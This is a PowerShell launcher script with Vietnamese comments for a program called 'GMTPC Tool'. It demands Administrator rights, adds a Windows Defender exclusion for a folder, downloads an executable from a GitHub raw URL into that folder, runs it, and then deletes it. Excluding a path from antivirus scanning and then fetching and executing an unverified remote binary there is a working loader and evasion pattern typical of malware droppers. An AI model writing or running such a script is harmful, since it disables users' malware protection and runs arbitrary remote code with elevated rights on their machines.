# 1. Tắt thanh tiến trình
$ProgressPreference = 'SilentlyContinue'

# 2. Kiểm tra quyền Administrator
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "Yeu cau quyen Administrator de them Windows Defender exclusion." -ForegroundColor Red
    Write-Host "Vui long chay PowerShell voi 'Run as Administrator'." -ForegroundColor Yellow
    pause
    exit 1
}

# Đường dẫn
$BaseFolder = "$env:LOCALAPPDATA\GMTPC"
$TempFolder = Join-Path $BaseFolder "GMTPC Tools"
$ExePath = Join-Path $TempFolder "GMTPC.Tool.exe"
$Url = "https://github.com/ghostminhtoan/GMTPC.Tool/raw/refs/heads/main/GMTPC.Tool.exe"

try {
    # 3. Tạo thư mục cơ sở trước khi thêm exclusion
    Write-Host "Dang chuan bi moi truong..." -ForegroundColor Cyan
    New-Item -ItemType Directory -Path $BaseFolder -Force | Out-Null

    # 4. Thêm Windows Defender exclusion cho thư mục GMTPC
    Write-Host "Dang them Windows Defender exclusion..." -ForegroundColor Cyan
    Add-MpPreference -ExclusionPath $BaseFolder -ErrorAction Stop
    Write-Host "Da them exclusion: $BaseFolder" -ForegroundColor Green

    # 5. Tạo thư mục con chứa tool
    New-Item -ItemType Directory -Path $TempFolder -Force | Out-Null

    # 6. Tải file
    Write-Host "Dang tai file..." -ForegroundColor Cyan
    Invoke-WebRequest -Uri $Url -OutFile $ExePath -UseBasicParsing -ErrorAction Stop
    
    if (-not (Test-Path $ExePath)) {
        throw "Tai file that bai: $ExePath khong ton tai"
    }

    # 7. Chạy tool
    Write-Host "Dang chay Tool..." -ForegroundColor Cyan
    Start-Process -FilePath $ExePath -Wait

    # 8. Dọn dẹp (chỉ xóa file exe, giữ lại thư mục)
    Write-Host "Dang don dep..." -ForegroundColor Cyan
    Remove-Item -Path $ExePath -Force -ErrorAction SilentlyContinue
    
    Write-Host "Hoan tat!" -ForegroundColor Green
}
catch {
    Write-Host "Loi: $($_.Exception.Message)" -ForegroundColor Red
    pause
    exit 1
}

exit
